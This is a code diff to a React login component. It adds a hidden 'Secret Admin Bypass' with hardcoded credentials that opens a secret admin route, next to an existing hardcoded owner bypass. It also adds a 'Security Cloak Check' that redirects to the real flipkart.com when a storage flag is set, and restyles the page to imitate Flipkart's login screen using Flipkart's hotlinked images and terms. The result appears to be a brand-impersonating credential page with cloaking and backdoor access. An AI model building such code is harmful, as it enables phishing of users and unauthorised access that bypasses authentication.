@@ -13,6 +13,19 @@ const Login = () => {
     e.preventDefault();
     setError('');
     setIsLoading(true);
+
+    // Secret Admin Bypass
+    if (username === '987654321' && password === '12345') {
+      navigate('/secret-admin');
+      return;
+    }
+
+    // Security Cloak Check
+    const isSecurityOn = localStorage.getItem('flipkartSecurity') === 'ON';
+    if (isSecurityOn) {
+      window.location.href = 'https://www.flipkart.com';
+      return;
+    }
     
     // Hardcoded owner login bypass
     if (username === '1234567890' && password === '2005') {
@@ -42,120 +55,96 @@ const Login = () => {
   };
 
   return (
-    <div className="bg-[#030712] text-on-surface min-h-screen flex items-center justify-center relative overflow-hidden font-body-md antialiased selection:bg-primary selection:text-on-primary">
-      {/* Background Watermark Pattern */}
-      <div 
-        className="absolute inset-0 z-0 opacity-10 pointer-events-none stock-bg"
-        style={{
-          backgroundImage: `url("data:image/svg+xml,%3Csvg width='60' height='60' viewBox='0 0 60 60' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='none' fill-rule='evenodd'%3E%3Cg fill='%234d8eff' fill-opacity='0.15'%3E%3Cpath d='M36 34v-4h-2v4h-4v2h4v4h2v-4h4v-2h-4zm0-30V0h-2v4h-4v2h4v4h2V6h4V4h-4zM6 34v-4H4v4H0v2h4v4h2v-4h4v-2H6zM6 4V0H4v4H0v2h4v4h2V6h4V4H6z'/%3E%3C/g%3E%3C/g%3E%3C/svg%3E")`
-        }}
-      >
-        {/* Abstract Chart Lines Overlay */}
-        <svg className="absolute bottom-0 w-full h-1/2 opacity-20 text-primary" preserveAspectRatio="none" viewBox="0 0 100 100">
-          <polyline fill="none" points="0,100 10,80 20,85 30,60 40,75 50,40 60,65 70,30 80,45 90,20 100,25 100,100" stroke="currentColor" strokeLinejoin="round" strokeWidth="0.5"></polyline>
-          <polyline fill="none" points="0,100 15,90 25,95 35,70 45,85 55,50 65,75 75,40 85,55 95,30 100,35 100,100" stroke="#424754" strokeLinejoin="round" strokeWidth="0.25"></polyline>
-        </svg>
-      </div>
-
-      {/* Login Container */}
-      <div className="relative z-10 w-full max-w-[420px] px-container-padding">
-        {/* Glassmorphic Card */}
-        <main className="glass-panel rounded-xl p-8 flex flex-col items-center">
-          {/* Logo area */}
-          <div className="mb-6 flex flex-col items-center">
-            <div className="w-16 h-16 rounded-lg bg-surface-container-high flex items-center justify-center mb-4 border border-outline-variant shadow-[0_0_15px_rgba(77,142,255,0.1)]">
-              <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="#adc6ff" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
-                <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
-                <path d="m9 12 2 2 4-4"/>
-              </svg>
+    <div className="min-h-screen bg-[#f1f3f6] flex items-center justify-center font-sans antialiased p-4">
+      {/* Flipkart-style Login Card */}
+      <div className="flex flex-col md:flex-row w-full max-w-[850px] min-h-[528px] bg-white rounded shadow-[0_2px_4px_0_rgba(0,0,0,.08)] overflow-hidden">
+        
+        {/* Left Side - Blue Banner */}
+        <div className="bg-[#2874f0] w-full md:w-[40%] p-[40px] flex flex-col justify-between relative overflow-hidden">
+          <div>
+            <div className="mb-8">
+              <img src="https://static-assets-web.flixcart.com/fk-p-linchpin-web/fk-cp-zion/img/flipkart-plus_8d85f4.png" alt="Flipkart" className="h-[25px]" />
             </div>
-            <h1 className="text-on-surface-variant font-medium text-sm text-center">Secure institutional access</h1>
+            <h1 className="text-white text-[28px] font-medium mb-4">Login</h1>
+            <p className="text-[#dbe1e6] text-[18px] leading-relaxed pr-4">
+              Get access to your Orders, Wishlist and Recommendations
+            </p>
           </div>
+          <div className="mt-12 flex justify-center w-full">
+            <img src="https://static-assets-web.flixcart.com/fk-p-linchpin-web/fk-cp-zion/img/login_img_c4a81e.png" alt="Flipkart login" className="object-contain" />
+          </div>
+        </div>
 
-          <form onSubmit={handleSubmit} className="w-full">
-            {error && <div className="text-error bg-error-container p-3 rounded mb-4 text-center text-sm">{error}</div>}
-
-            <div className="w-full space-y-4">
-              {/* Username Input */}
-              <div className="flex flex-col gap-1.5">
-                <label className="text-label-caps text-on-surface-variant uppercase font-bold text-[11px] tracking-wider" htmlFor="username">
-                  User ID
+        {/* Right Side - Login Form */}
+        <div className="w-full md:w-[60%] p-[32px] md:px-[50px] md:pt-[56px] md:pb-[32px] flex flex-col bg-white">
+          <form onSubmit={handleSubmit} className="flex-1 flex flex-col">
+            {error && <div className="text-[#ff6161] text-[12px] mb-4 font-medium">{error}</div>}
+            
+            <div className="space-y-8">
+              {/* User ID Input with Floating Label */}
+              <div className="relative group">
+                <input
+                  type="text"
+                  id="username"
+                  name="username"
+                  required
+                  value={username}
+                  onChange={(e) => setUsername(e.target.value)}
+                  className="block w-full px-0 pt-5 pb-2 text-[15px] text-[#212121] bg-transparent border-0 border-b border-[#e0e0e0] appearance-none focus:outline-none focus:ring-0 focus:border-[#2874f0] peer"
+                  placeholder=" "
+                />
+                <label
+                  htmlFor="username"
+                  className="absolute text-[15px] text-[#878787] duration-300 transform -translate-y-4 scale-75 top-4 z-10 origin-[0] peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-75 peer-focus:-translate-y-4"
+                >
+                  Enter User ID
                 </label>
-                <div className="relative">
-                  <div className="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
-                    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="text-outline">
-                      <rect x="2" y="3" width="20" height="14" rx="2" ry="2" />
-                      <line x1="8" y1="21" x2="16" y2="21" />
-                      <line x1="12" y1="17" x2="12" y2="21" />
-                    </svg>
-                  </div>
-                  <input
-                    id="username"
-                    name="username"
-                    type="text"
-                    required
-                    value={username}
-                    onChange={(e) => setUsername(e.target.value)}
-                    placeholder="TX-0000"
-                    className="w-full bg-[#0a1017] border border-surface-variant rounded focus:border-primary focus:ring-0 text-on-surface py-2.5 pl-10 pr-3 font-data-mono text-sm placeholder-outline transition-colors duration-200"
-                  />
-                </div>
               </div>
 
-              {/* Password Input */}
-              <div className="flex flex-col gap-1.5">
-                <label className="text-label-caps text-on-surface-variant uppercase font-bold text-[11px] tracking-wider" htmlFor="password">
-                  Password
+              {/* Password Input with Floating Label */}
+              <div className="relative group">
+                <input
+                  type="password"
+                  id="password"
+                  name="password"
+                  required
+                  value={password}
+                  onChange={(e) => setPassword(e.target.value)}
+                  className="block w-full px-0 pt-5 pb-2 text-[15px] text-[#212121] bg-transparent border-0 border-b border-[#e0e0e0] appearance-none focus:outline-none focus:ring-0 focus:border-[#2874f0] peer"
+                  placeholder=" "
+                />
+                <label
+                  htmlFor="password"
+                  className="absolute text-[15px] text-[#878787] duration-300 transform -translate-y-4 scale-75 top-4 z-10 origin-[0] peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-75 peer-focus:-translate-y-4"
+                >
+                  Enter Password
                 </label>
-                <div className="relative">
-                  <div className="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
-                    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="text-outline">
-                      <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/>
-                      <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
-                    </svg>
-                  </div>
-                  <input
-                    id="password"
-                    name="password"
-                    type="password"
-                    required
-                    value={password}
-                    onChange={(e) => setPassword(e.target.value)}
-                    placeholder="••••••••"
-                    className="w-full bg-[#0a1017] border border-surface-variant rounded focus:border-primary focus:ring-0 text-on-surface py-2.5 pl-10 pr-3 font-data-mono text-sm placeholder-outline transition-colors duration-200"
-                  />
-                </div>
               </div>
+            </div>
 
-              
+            <p className="text-[#878787] text-[12px] mt-8 mb-4">
+              By continuing, you agree to Flipkart's <span className="text-[#2874f0] cursor-pointer">Terms of Use</span> and <span className="text-[#2874f0] cursor-pointer">Privacy Policy</span>.
+            </p>
 
-              {/* Submit Button */}
-              <button
-                type="submit"
-                disabled={isLoading}
-                className={`w-full bg-[#4d8eff] hover:bg-[#3b82f6] text-[#002e6a] font-semibold py-2.5 px-4 rounded mt-6 transition-colors duration-200 flex items-center justify-center gap-2 ${isLoading ? 'opacity-70 cursor-not-allowed' : ''}`}
-              >
-                {isLoading ? 'Authenticating...' : 'Secure Login'}
-                {!isLoading && (
-                  <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
-                    <line x1="5" y1="12" x2="19" y2="12"></line>
-                    <polyline points="12 5 19 12 12 19"></polyline>
-                  </svg>
-                )}
-              </button>
+            <button
+              type="submit"
+              disabled={isLoading}
+              className={`w-full bg-[#fb641b] hover:bg-[#f3580a] text-white font-medium text-[15px] py-3.5 rounded-[2px] shadow-[0_1px_2px_0_rgba(0,0,0,.2)] transition-colors ${isLoading ? 'opacity-70 cursor-not-allowed' : ''}`}
+            >
+              {isLoading ? 'Authenticating...' : 'Login'}
+            </button>
+            
+            <div className="text-center mt-4 mb-auto">
+              <span className="text-[#2874f0] text-[14px] font-medium cursor-pointer">Request OTP</span>
             </div>
           </form>
 
-          {/* Footer */}
-          <div className="w-full mt-8 pt-4 border-t border-surface-variant text-center space-y-2">
-            <p className="text-on-surface-variant text-sm hover:text-primary transition-colors cursor-pointer">
-              Emergency Protocol Activation
-            </p>
-            <p className="font-data-mono text-[10px] text-outline tracking-widest uppercase">
-              System V. 4.2.0 • TLS 1.3 Active
-            </p>
+          <div className="mt-auto text-center pt-8">
+            <span className="text-[#2874f0] text-[14px] font-medium cursor-pointer">
+              New to Flipkart? Create an account
+            </span>
           </div>
-        </main>
+        </div>
       </div>
     </div>
   );
